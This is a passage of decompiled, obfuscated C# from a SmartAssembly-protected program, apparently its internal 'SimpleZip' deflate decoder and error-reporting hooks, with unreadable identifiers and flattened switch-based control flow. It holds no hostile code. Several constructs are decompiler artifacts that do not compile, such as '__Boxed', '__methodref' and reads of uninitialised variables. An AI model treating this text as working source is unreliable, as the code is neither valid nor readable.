          __Boxed<int> o2 = (ValueType) obj0;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) obj1;
          StackFrameHelper.CreateException3(ex, (object) o1, (object) o2, (object) o3);
          throw;
        }
      }

      internal static string Ⴀ([In] ref long obj0, [In] string obj1, [In] int obj2, [In] int obj3)
      {
        int num1;
        try
        {
label_3:
          int num2;
          switch (obj3 ^ obj2)
          {
            case 28:
              num2 = 6;
              break;
            default:
              num2 = 7;
              break;
          }
          num1 = num2;
          while (true)
          {
            switch (num1)
            {
              case 1:
                goto label_3;
              case 2:
              case 5:
                num1 = 1;
                continue;
              case 3:
              case 6:
                goto label_8;
              case 4:
              case 7:
                num1 = 1;
                continue;
              default:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (SimpleZip.ႤႤ.Ⴀ);
                num1 = 1;
                continue;
            }
          }
label_8:
          return obj0.ToString(obj1);
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<long> o2 = (ValueType) obj0;
          string o3 = obj1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) obj2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o5 = (ValueType) obj3;
          StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5);
          throw;
        }
      }

      internal static int Ⴓ([In] ref Rectangle obj0, [In] int obj1, [In] int obj2)
      {
        int num1;
        try
        {
label_3:
          int num2;
          switch (obj2 ^ obj1)
          {
            case 56:
              num2 = 1;
              break;
            default:
              num2 = 3;
              break;
          }
          num1 = num2;
          while (true)
          {
            switch (num1)
            {
              case 0:
              case 3:
                num1 = 4;
                continue;
              case 1:
                goto label_8;
              case 2:
              case 7:
                num1 = 4;
                continue;
              case 4:
                goto label_3;
              default:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (SimpleZip.ႤႤ.Ⴓ);
                num1 = 4;
                continue;
            }
          }
label_8:
          return obj0.Left;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<Rectangle> o2 = (ValueType) obj0;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) obj1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) obj2;
          StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
          throw;
        }
      }

      internal static int ႨႣ([In] ref Size obj0, [In] int obj1, [In] int obj2)
      {
        int num1;
        try
        {
label_3:
          int num2;
          switch (obj2 ^ obj1)
          {
            case 6:
              num2 = 4;
              break;
            default:
              num2 = 5;
              break;
          }
          num1 = num2;
          while (true)
          {
            switch (num1)
            {
              case 1:
              case 4:
                goto label_8;
              case 2:
              case 5:
                num1 = 3;
                continue;
              case 3:
                goto label_3;
              case 6:
              case 7:
                num1 = 3;
                continue;
              default:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (SimpleZip.ႤႤ.ႨႣ);
                num1 = 3;
                continue;
            }
          }
label_8:
          return obj0.Width;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<Size> o2 = (ValueType) obj0;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) obj1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) obj2;
          StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
          throw;
        }
      }

      [StructLayout(LayoutKind.Auto)]
      internal struct Ⴜ
      {
        internal SecurityExceptionEventArgs Ⴓ;
        internal PoweredBy Ⴅ;
        internal Button Ⴐ;
        internal Button Ⴃ;
        internal HeaderControl Ⴈ;
        internal AutoHeightLabel Ⴄ;
      }
    }

    internal sealed class ႤႭ
    {
      private SimpleZip.Ⴀ Ⴈ;

      public void Ⴐ(int Ⴓ)
      {
        int num1;
        int num2;
        int num3;
        int num4;
        int num5;
        try
        {
          try
          {
            num1 = 7;
            while (true)
            {
              switch (num1)
              {
                case 0:
                  goto label_5;
                case 1:
                case 2:
                  num1 = 3;
                  continue;
                case 3:
                  num1 = num2 != 32768 ? 5 : 0;
                  continue;
                case 5:
                  byte[] ⴓ = this.Ⴈ.Ⴓ;
                  SimpleZip.ႤႭ ⴄⴍ1 = this;
                  num4 = (num2 = ⴄⴍ1.Ⴈ.Ⴄ) + 1;
                  ⴄⴍ1.Ⴈ.Ⴄ = num4;
                  int index = num2;
                  int num6 = (int) (byte) Ⴓ;
                  ⴓ[index] = (byte) num6;
                  num1 = 8;
                  continue;
                case 8:
                  goto label_7;
                default:
                  SimpleZip.ႤႭ ⴄⴍ2 = this;
                  num3 = (num2 = ⴄⴍ2.Ⴈ.Ⴈ) + 1;
                  ⴄⴍ2.Ⴈ.Ⴈ = num3;
                  goto case 1;
              }
            }
label_5:
            throw new InvalidOperationException();
label_7:
            SimpleZip.ႤႭ ⴄⴍ3 = this;
            num5 = ⴄⴍ3.Ⴈ.Ⴄ & (int) short.MaxValue;
            ⴄⴍ3.Ⴈ.Ⴄ = num5;
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> o1 = (ValueType) num2;
            // ISSUE: variable of a boxed type
            __Boxed<int> o3 = (ValueType) Ⴓ;
            StackFrameHelper.CreateException3(ex, (object) o1, (object) this, (object) o3);
            throw;
          }
          switch (0)
          {
          }
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) num3;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) num4;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) num5;
          // ISSUE: variable of a boxed type
          __Boxed<int> o5 = (ValueType) num1;
          int num7;
          // ISSUE: variable of a boxed type
          __Boxed<int> o6 = (ValueType) num7;
          // ISSUE: variable of a boxed type
          __Boxed<int> o8 = (ValueType) Ⴓ;
          StackFrameHelper.CreateException8(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6, (object) this, (object) o8);
          throw;
        }
      }

      private void Ⴃ(int Ⴅ, int Ⴐ, int Ⴓ)
      {
        int num1;
        int ⴄ;
        int num2;
        int num3;
        try
        {
          try
          {
            num1 = 1;
            while (true)
            {
              switch (num1)
              {
                case 2:
                  Ⴅ &= (int) short.MaxValue;
                  num1 = 3;
                  continue;
                case 3:
                  num1 = Ⴐ-- > 0 ? 5 : 7;
                  continue;
                case 5:
                  byte[] ⴓ = this.Ⴈ.Ⴓ;
                  SimpleZip.ႤႭ ⴄⴍ1 = this;
                  num2 = (ⴄ = ⴄⴍ1.Ⴈ.Ⴄ) + 1;
                  ⴄⴍ1.Ⴈ.Ⴄ = num2;
                  int index = ⴄ;
                  int num4 = (int) this.Ⴈ.Ⴓ[Ⴅ++];
                  ⴓ[index] = (byte) num4;
                  num1 = 9;
                  continue;
                case 7:
                  goto label_9;
                case 8:
                case 9:
                  SimpleZip.ႤႭ ⴄⴍ2 = this;
                  num3 = ⴄⴍ2.Ⴈ.Ⴄ & (int) short.MaxValue;
                  ⴄⴍ2.Ⴈ.Ⴄ = num3;
                  num1 = 2;
                  continue;
                default:
                  num1 = 3;
                  continue;
              }
            }
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> o1 = (ValueType) ⴄ;
            // ISSUE: variable of a boxed type
            __Boxed<int> o3 = (ValueType) Ⴅ;
            // ISSUE: variable of a boxed type
            __Boxed<int> o4 = (ValueType) Ⴐ;
            // ISSUE: variable of a boxed type
            __Boxed<int> o5 = (ValueType) Ⴓ;
            StackFrameHelper.CreateException5(ex, (object) o1, (object) this, (object) o3, (object) o4, (object) o5);
            throw;
          }
label_9:
          switch (2)
          {
          }
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) ⴄ;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) num3;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) num1;
          int num5;
          // ISSUE: variable of a boxed type
          __Boxed<int> o5 = (ValueType) num5;
          // ISSUE: variable of a boxed type
          __Boxed<int> o7 = (ValueType) Ⴅ;
          // ISSUE: variable of a boxed type
          __Boxed<int> o8 = (ValueType) Ⴐ;
          // ISSUE: variable of a boxed type
          __Boxed<int> o9 = (ValueType) Ⴓ;
          StackFrameHelper.CreateException9(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) this, (object) o7, (object) o8, (object) o9);
          throw;
        }
      }

      public void Ⴃ(int Ⴀ, int Ⴅ)
      {
        int num1;
        int num2;
        int num3;
        int Ⴅ1;
        int num4;
        int num5;
        int num6;
        try
        {
          try
          {
            num1 = 2;
            while (true)
            {
              switch (num1)
              {
                case 0:
                case 5:
                  AppPathFinder.Ⴍ((Array) this.Ⴈ.Ⴓ, Ⴅ1, (Array) this.Ⴈ.Ⴓ, this.Ⴈ.Ⴄ, Ⴀ, 110, 116);
                  num1 = 6;
                  continue;
                case 1:
                case 13:
                  goto label_17;
                case 3:
                  Ⴅ1 = this.Ⴈ.Ⴄ - Ⴅ & (int) short.MaxValue;
                  num4 = 32768 - Ⴀ;
                  num1 = 9;
                  continue;
                case 6:
                  goto label_10;
                case 7:
                  byte[] ⴓ = this.Ⴈ.Ⴓ;
                  SimpleZip.ႤႭ ⴄⴍ1 = this;
                  num6 = (num2 = ⴄⴍ1.Ⴈ.Ⴄ) + 1;
                  ⴄⴍ1.Ⴈ.Ⴄ = num6;
                  int index = num2;
                  int num7 = (int) this.Ⴈ.Ⴓ[Ⴅ1++];
                  ⴓ[index] = (byte) num7;
                  num1 = 15;
                  continue;
                case 8:
                case 14:
                  num1 = Ⴀ > Ⴅ ? 15 : 0;
                  continue;
                case 9:
                  num1 = Ⴅ1 > num4 ? 11 : 12;
                  continue;
                case 10:
                  goto label_4;
                case 11:
                  goto label_15;
                case 12:
                  num1 = this.Ⴈ.Ⴄ >= num4 ? 11 : 8;
                  continue;
                case 15:
                  num1 = Ⴀ-- > 0 ? 7 : 13;
                  continue;
                case 16:
                  num1 = num2 <= 32768 ? 3 : 10;
                  continue;
                default:
                  SimpleZip.ႤႭ ⴄⴍ2 = this;
                  num3 = num2 = ⴄⴍ2.Ⴈ.Ⴈ + Ⴀ;
                  ⴄⴍ2.Ⴈ.Ⴈ = num3;
                  num1 = 16;
                  continue;
              }
            }
label_4:
            throw new InvalidOperationException();
label_10:
            SimpleZip.ႤႭ ⴄⴍ3 = this;
            num5 = ⴄⴍ3.Ⴈ.Ⴄ + Ⴀ;
            ⴄⴍ3.Ⴈ.Ⴄ = num5;
            goto label_17;
label_15:
            this.Ⴃ(Ⴅ1, Ⴀ, Ⴅ);
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> o1 = (ValueType) Ⴅ1;
            // ISSUE: variable of a boxed type
            __Boxed<int> o2 = (ValueType) num4;
            // ISSUE: variable of a boxed type
            __Boxed<int> o3 = (ValueType) num2;
            // ISSUE: variable of a boxed type
            __Boxed<int> o5 = (ValueType) Ⴀ;
            // ISSUE: variable of a boxed type
            __Boxed<int> o6 = (ValueType) Ⴅ;
            StackFrameHelper.CreateException6(ex, (object) o1, (object) o2, (object) o3, (object) this, (object) o5, (object) o6);
            throw;
          }
label_17:
          switch (0)
          {
          }
        }
        catch (Exception ex)
        {
          int num8;
          object[] objects = new object[11]
          {
            (object) Ⴅ1,
            (object) num4,
            (object) num2,
            (object) num3,
            (object) num5,
            (object) num6,
            (object) num1,
            (object) num8,
            (object) this,
            (object) Ⴀ,
            (object) Ⴅ
          };
          StackFrameHelper.CreateExceptionN(ex, objects);
          throw;
        }
      }

      public int Ⴓ(SimpleZip.ႤႤ Ⴍ, int Ⴐ)
      {
        int num1;
        int Ⴗ;
        int num2;
        int num3;
        int num4;
        int num5;
        try
        {
          try
          {
            num1 = 0;
            while (true)
            {
              switch (num1)
              {
                case 1:
                case 9:
                  num2 = Ⴍ.Ⴅ(this.Ⴈ.Ⴓ, this.Ⴈ.Ⴄ, Ⴐ);
                  num1 = 10;
                  continue;
                case 2:
                case 12:
                  SimpleZip.ႤႭ ⴄⴍ = this;
                  num4 = ⴄⴍ.Ⴈ.Ⴈ + num2;
                  ⴄⴍ.Ⴈ.Ⴈ = num4;
                  num1 = 4;
                  continue;
                case 3:
                  Ⴗ = 32768 - this.Ⴈ.Ⴄ;
                  num1 = Ⴐ <= Ⴗ ? 1 : 8;
                  continue;
                case 4:
                  goto label_11;
                case 6:
                  num2 += Ⴍ.Ⴅ(this.Ⴈ.Ⴓ, 0, Ⴐ - Ⴗ);
                  goto case 11;
                case 7:
                  num1 = num2 != Ⴗ ? 10 : 6;
                  continue;
                case 8:
                  num2 = Ⴍ.Ⴅ(this.Ⴈ.Ⴓ, this.Ⴈ.Ⴄ, Ⴗ);
                  num1 = 7;
                  continue;
                case 10:
                  num3 = this.Ⴈ.Ⴄ + num2 & (int) short.MaxValue;
                  this.Ⴈ.Ⴄ = num3;
                  num1 = 12;
                  continue;
                case 11:
                  num1 = 10;
                  continue;
                default:
                  Ⴐ = Ⴈ.Ⴗ.Ⴃ(Ⴈ.Ⴗ.Ⴃ(Ⴐ, 32768 - this.Ⴈ.Ⴈ, 605, 552), Ⴍ.Ⴈ(), 317, 328);
                  num1 = 3;
                  continue;
              }
            }
label_11:
            num5 = num2;
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> o1 = (ValueType) num2;
            // ISSUE: variable of a boxed type
            __Boxed<int> o2 = (ValueType) Ⴗ;
            SimpleZip.ႤႤ o4 = Ⴍ;
            // ISSUE: variable of a boxed type
            __Boxed<int> o5 = (ValueType) Ⴐ;
            StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) this, (object) o4, (object) o5);
            throw;
          }
          switch (0)
          {
            default:
              return num5;
          }
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) Ⴗ;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) num5;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) num3;
          // ISSUE: variable of a boxed type
          __Boxed<int> o5 = (ValueType) num4;
          // ISSUE: variable of a boxed type
          __Boxed<int> o6 = (ValueType) num1;
          int num6;
          // ISSUE: variable of a boxed type
          __Boxed<int> o7 = (ValueType) num6;
          SimpleZip.ႤႤ o9 = Ⴍ;
          // ISSUE: variable of a boxed type
          __Boxed<int> o10 = (ValueType) Ⴐ;
          StackFrameHelper.CreateException10(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6, (object) o7, (object) this, (object) o9, (object) o10);
          throw;
        }
      }

      public int Ⴀ()
      {
        try
        {
          int num;
          try
          {
            num = 32768 - this.Ⴈ.Ⴈ;
          }
          catch (Exception ex)
          {
            StackFrameHelper.CreateException1(ex, (object) this);
            throw;
          }
          return num;
        }
        catch (Exception ex)
        {
          int num;
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num;
          StackFrameHelper.CreateException2(ex, (object) o1, (object) this);
          throw;
        }
      }

      public int Ⴃ()
      {
        try
        {
          int ⴈ;
          try
          {
            ⴈ = this.Ⴈ.Ⴈ;
          }
          catch (Exception ex)
          {
            StackFrameHelper.CreateException1(ex, (object) this);
            throw;
          }
          return ⴈ;
        }
        catch (Exception ex)
        {
          int num;
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num;
          StackFrameHelper.CreateException2(ex, (object) o1, (object) this);
          throw;
        }
      }

      public int Ⴅ(byte[] Ⴓ, int Ⴍ, int Ⴗ)
      {
        int num1;
        int num2;
        int num3;
        int num4;
        int num5;
        int num6;
        try
        {
          try
          {
            num1 = 5;
            while (true)
            {
              switch (num1)
              {
                case 0:
                  num1 = Ⴗ <= this.Ⴈ.Ⴈ ? 3 : 13;
                  continue;
                case 1:
                  SimpleZip.ႤႭ ⴄⴍ = this;
                  num5 = ⴄⴍ.Ⴈ.Ⴈ - num3;
                  ⴄⴍ.Ⴈ.Ⴈ = num5;
                  num1 = 2;
                  continue;
                case 2:
                case 12:
                  num1 = this.Ⴈ.Ⴈ >= 0 ? 7 : 9;
                  continue;
                case 3:
                  num2 = this.Ⴈ.Ⴄ - this.Ⴈ.Ⴈ + Ⴗ & (int) short.MaxValue;
                  num1 = 14;
                  continue;
                case 4:
                  AppPathFinder.Ⴍ((Array) this.Ⴈ.Ⴓ, num2 - Ⴗ, (Array) Ⴓ, Ⴍ, Ⴗ, 453, 479);
                  num1 = 1;
                  continue;
                case 6:
                case 9:
                  goto label_12;
                case 7:
                  goto label_13;
                case 8:
                  Ⴍ += num4;
                  Ⴗ = num2;
                  num1 = 4;
                  continue;
                case 11:
                  AppPathFinder.Ⴍ((Array) this.Ⴈ.Ⴓ, 32768 - num4, (Array) Ⴓ, Ⴍ, num4, 540, 518);
                  num1 = 8;
                  continue;
                case 13:
                  Ⴗ = this.Ⴈ.Ⴈ;
                  num1 = 14;
                  continue;
                case 14:
                  num3 = Ⴗ;
                  num4 = Ⴗ - num2;
                  num1 = num4 <= 0 ? 4 : 11;
                  continue;
                default:
                  num2 = this.Ⴈ.Ⴄ;
                  goto case 0;
              }
            }
label_12:
            throw new InvalidOperationException();
label_13:
            num6 = num3;
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> o1 = (ValueType) num2;
            // ISSUE: variable of a boxed type
            __Boxed<int> o2 = (ValueType) num3;
            // ISSUE: variable of a boxed type
            __Boxed<int> o3 = (ValueType) num4;
            byte[] o5 = Ⴓ;
            // ISSUE: variable of a boxed type
            __Boxed<int> o6 = (ValueType) Ⴍ;
            // ISSUE: variable of a boxed type
            __Boxed<int> o7 = (ValueType) Ⴗ;
            StackFrameHelper.CreateException7(ex, (object) o1, (object) o2, (object) o3, (object) this, (object) o5, (object) o6, (object) o7);
            throw;
          }
          switch (0)
          {
            default:
              return num6;
          }
        }
        catch (Exception ex)
        {
          int num7;
          object[] objects = new object[11]
          {
            (object) num2,
            (object) num3,
            (object) num4,
            (object) num6,
            (object) num5,
            (object) num1,
            (object) num7,
            (object) this,
            (object) Ⴓ,
            (object) Ⴍ,
            (object) Ⴗ
          };
          StackFrameHelper.CreateExceptionN(ex, objects);
          throw;
        }
      }

      public ႤႭ()
      {
        this.Ⴈ.Ⴓ = new byte[32768];
        this.Ⴈ.Ⴄ = 0;
        this.Ⴈ.Ⴈ = 0;
        // ISSUE: explicit constructor call
        base.\u002Ector();
        try
        {
        }
        catch (Exception ex)
        {
          byte[] numArray;
          byte[] o1 = numArray;
          int num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) num1;
          int num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) num2;
          StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) this);
          throw;
        }
      }

      static ႤႭ()
      {
        try
        {
          SmartAssembly.SmartUsageCore.DoNotPruneAttribute.ႰႣ();
        }
        catch (Exception ex)
        {
          StackFrameHelper.CreateException0(ex);
          throw;
        }
      }

      internal static string Ⴄ([In] ref uint obj0, [In] string obj1, [In] int obj2, [In] int obj3)
      {
        int num1;
        try
        {
label_3:
          int num2;
          switch (obj3 ^ obj2)
          {
            case 101:
              num2 = 4;
              break;
            default:
              num2 = 3;
              break;
          }
          num1 = num2;
          while (true)
          {
            switch (num1)
            {
              case 1:
                goto label_3;
              case 3:
                num1 = 1;
                continue;
              case 4:
                goto label_8;
              case 7:
                num1 = 1;
                continue;
              default:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (SimpleZip.ႤႭ.Ⴄ);
                num1 = 1;
                continue;
            }
          }
label_8:
          return obj0.ToString(obj1);
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<uint> o2 = (ValueType) obj0;
          string o3 = obj1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) obj2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o5 = (ValueType) obj3;
          StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5);
          throw;
        }
      }

      internal static string Ⴜ([In] string obj0, [In] char obj1, [In] char obj2, [In] int obj3, [In] int obj4)
      {
        int num1;
        try
        {
label_3:
          int num2;
          switch (obj4 ^ obj3)
          {
            case 113:
              num2 = 5;
              break;
            default:
              num2 = 6;
              break;
          }
          num1 = num2;
          while (true)
          {
            switch (num1)
            {
              case 0:
              case 2:
                goto label_3;
              case 1:
              case 5:
                goto label_8;
              case 3:
                num1 = 2;
                continue;
              case 6:
                num1 = 2;
                continue;
              default:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (SimpleZip.ႤႭ.Ⴜ);
                num1 = 2;
                continue;
            }
          }
label_8:
          return obj0.Replace(obj1, obj2);
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num1;
          string o2 = obj0;
          // ISSUE: variable of a boxed type
          __Boxed<char> o3 = (ValueType) obj1;
          // ISSUE: variable of a boxed type
          __Boxed<char> o4 = (ValueType) obj2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o5 = (ValueType) obj3;
          // ISSUE: variable of a boxed type
          __Boxed<int> o6 = (ValueType) obj4;
          StackFrameHelper.CreateException6(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6);
          throw;
        }
      }

      [StructLayout(LayoutKind.Auto)]
      internal struct Ⴍ
      {
        internal ReportSender Ⴀ;
      }

      [StructLayout(LayoutKind.Auto)]
      internal struct Ⴗ
      {
        internal string Ⴐ;
        internal string Ⴀ;
        internal string Ⴄ;
      }
    }

    internal sealed class ႤႳ
    {
      public static readonly SimpleZip.ႤႳ Ⴅ;
      public static readonly SimpleZip.ႤႳ Ⴐ;
      private SimpleZip.ႤႷ.Ⴀ Ⴓ;

      static ႤႳ()
      {
        int num1;
        byte[] Ⴃ;
        int num2;
        try
        {
          SmartAssembly.SmartUsageCore.DoNotPruneAttribute.ႰႣ();
          try
          {
            num1 = 13;
            while (true)
            {
              switch (num1)
              {
                case 0:
                  Ⴃ[num2++] = (byte) 8;
                  num1 = 17;
                  continue;
                case 1:
                case 16:
                  num1 = 17;
                  continue;
                case 2:
                case 6:
                  num1 = num2 < 256 ? 11 : 10;
                  continue;
                case 3:
                  SimpleZip.ႤႳ.Ⴅ = new SimpleZip.ႤႳ(Ⴃ);
                  Ⴃ = new byte[32];
                  num2 = 0;
                  num1 = 15;
                  continue;
                case 4:
                  Ⴃ[num2++] = (byte) 8;
                  num1 = 9;
                  continue;
                case 5:
                  Ⴃ[num2++] = (byte) 5;
                  num1 = 15;
                  continue;
                case 7:
                case 8:
                  num1 = 2;
                  continue;
                case 9:
                  num1 = num2 < 144 ? 4 : 8;
                  continue;
                case 10:
                  num1 = 18;
                  continue;
                case 11:
                  Ⴃ[num2++] = (byte) 9;
                  num1 = 2;
                  continue;
                case 12:
                  goto label_18;
                case 14:
                  Ⴃ[num2++] = (byte) 7;
                  num1 = 18;
                  continue;
                case 15:
                  num1 = num2 < 32 ? 5 : 12;
                  continue;
                case 17:
                  num1 = num2 < 288 ? 0 : 3;
                  continue;
                case 18:
                  num1 = num2 < 280 ? 14 : 1;
                  continue;
                default:
                  Ⴃ = new byte[288];
                  num2 = 0;
                  num1 = 9;
                  continue;
              }
            }
label_18:
            SimpleZip.ႤႳ.Ⴐ = new SimpleZip.ႤႳ(Ⴃ);
          }
          catch (Exception ex)
          {
            byte[] o1 = Ⴃ;
            // ISSUE: variable of a boxed type
            __Boxed<int> o2 = (ValueType) num2;
            StackFrameHelper.CreateException2(ex, (object) o1, (object) o2);
            throw;
          }
        }
        catch (Exception ex)
        {
          byte[] o1 = Ⴃ;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) num1;
          StackFrameHelper.CreateException3(ex, (object) o1, (object) o2, (object) o3);
          throw;
        }
      }

      public ႤႳ(byte[] Ⴃ)
      {
        try
        {
          try
          {
            this.Ⴃ(Ⴃ);
          }
          catch (Exception ex)
          {
            byte[] o2 = Ⴃ;
            StackFrameHelper.CreateException2(ex, (object) this, (object) o2);
            throw;
          }
        }
        catch (Exception ex)
        {
          byte[] o2 = Ⴃ;
          StackFrameHelper.CreateException2(ex, (object) this, (object) o2);
          throw;
        }
      }

      private void Ⴃ(byte[] Ⴀ)
      {
        int num1;
        int[] numArray1;
        int[] numArray2;
        int index1;
        int num2;
        int[] numArray3;
        IntPtr index2;
        int Ⴃ1;
        int length;
        int index3;
        int num3;
        int num4;
        short[] numArray4;
        int num5;
        int index4;
        int num6;
        int num7;
        int Ⴃ2;
        int index5;
        int index6;
        int index7;
        int num8;
        int num9;
        object[] objArray;
        try
        {
          try
          {
            num1 = 7;
            while (true)
            {
              switch (num1)
              {
                case 0:
                case 14:
                  ++index5;
                  num1 = 12;
                  continue;
                case 1:
                  index5 = 0;
                  num1 = 12;
                  continue;
                case 2:
                  num1 = index4 >= 10 ? 36 : 1;
                  continue;
                case 3:
                  num8 = -(num8 >> 4);
                  num1 = 16;
                  continue;
                case 4:
                  num1 = index3 <= 15 ? 22 : 17;
                  continue;
                case 5:
                  goto label_40;
                case 6:
                  Ⴃ1 = 0;
                  length = 512;
                  index3 = 1;
                  num1 = 4;
                  continue;
                case 8:
                  --index4;
                  num1 = 2;
                  continue;
                case 9:
                  (numArray3 = numArray1)[(int) (index2 = (IntPtr) num2)] = numArray3[index2] + 1;
                  num1 = 32;
                  continue;
                case 10:
                  ++index3;
                  num1 = 4;
                  continue;
                case 11:
                  index7 += 1 << index6;
                  num1 = index7 < 512 ? 26 : 37;
                  continue;
                case 12:
                  num1 = index5 < Ⴀ.Length ? 20 : 5;
                  continue;
                case 13:
                  num7 = Ⴃ1 & 130944;
                  Ⴃ2 = num7;
                  num1 = 39;
                  continue;
                case 15:
                  this.Ⴓ.Ⴄ[(int) SimpleZip.ႤႠ.Ⴓ(Ⴃ2)] = (short) (-num5 << 4 | index4);
                  num1 = 33;
                  continue;
                case 16:
                  this.Ⴓ.Ⴄ[num8 | index7 >> 9] = (short) (index5 << 4 | index6);
                  num1 = 38;
                  continue;
                case 17:
                  numArray4 = new short[length];
                  this.Ⴓ.Ⴄ = numArray4;
                  num5 = 512;
                  num1 = 18;
                  continue;
                case 18:
                  index4 = 15;
                  num1 = 2;
                  continue;
                case 19:
                  num3 = numArray2[index3] & 130944;
                  num4 = Ⴃ1 & 130944;
                  num1 = 30;
                  continue;
                case 20:
                  index6 = (int) Ⴀ[index5];
                  num1 = index6 == 0 ? 0 : 24;
                  continue;
                case 21:
                case 39:
                  num1 = Ⴃ2 < num6 ? 15 : 8;
                  continue;
                case 22:
                  numArray2[index3] = Ⴃ1;
                  Ⴃ1 += numArray1[index3] << 16 - index3;
                  num1 = 35;
                  continue;
                case 23:
                  num1 = index1 < Ⴀ.Length ? 34 : 6;
                  continue;
                case 24:
                  Ⴃ1 = numArray2[index6];
                  index7 = (int) SimpleZip.ႤႠ.Ⴓ(Ⴃ1);
                  num1 = index6 > 9 ? 27 : 26;
                  continue;
                case 26:
                  this.Ⴓ.Ⴄ[index7] = (short) (index5 << 4 | index6);
                  num1 = 11;
                  continue;
                case 27:
                  num8 = (int) this.Ⴓ.Ⴄ[index7 & 511];
                  num9 = 1 << (num8 & 15);
                  num1 = 3;
                  continue;
                case 28:
                  Ⴃ2 += 128;
                  num1 = 39;
                  continue;
                case 29:
                  numArray2[index6] = Ⴃ1 + (1 << 16 - index6);
                  num1 = 0;
                  continue;
                case 30:
                  length += num4 - num3 >> 16 - index3;
                  num1 = 10;
                  continue;
                case 31:
                  num1 = index7 < num9 ? 16 : 29;
                  continue;
                case 32:
                  ++index1;
                  num1 = 23;
                  continue;
                case 33:
                  num5 += 1 << index4 - 9;
                  num1 = 28;
                  continue;
                case 34:
                  num2 = (int) Ⴀ[index1];
                  num1 = num2 <= 0 ? 32 : 9;
                  continue;
                case 35:
                  num1 = index3 < 10 ? 10 : 19;
                  continue;
                case 36:
                  num6 = Ⴃ1 & 130944;
                  Ⴃ1 -= numArray1[index4] << 16 - index4;
                  num1 = 13;
                  continue;
                case 37:
                  num1 = 29;
                  continue;
                case 38:
                  index7 += 1 << index6;
                  goto case 31;
                default:
                  numArray1 = new int[16];
                  numArray2 = new int[16];
                  index1 = 0;
                  num1 = 23;
                  continue;
              }
            }
          }
          catch (Exception ex)
          {
            objArray = new object[23]
            {
              (object) numArray1,
              (object) numArray2,
              (object) index1,
              (object) num2,
              (object) Ⴃ1,
              (object) length,
              (object) index3,
              (object) num3,
              (object) num4,
              (object) num5,
              (object) index4,
              (object) num6,
              (object) num7,
              (object) Ⴃ2,
              (object) index5,
              (object) index6,
              (object) index7,
              (object) num8,
              (object) num9,
              (object) numArray3,
              (object) index2,
              (object) this,
              (object) Ⴀ
            };
            object[] objects = objArray;
            StackFrameHelper.CreateExceptionN(ex, objects);
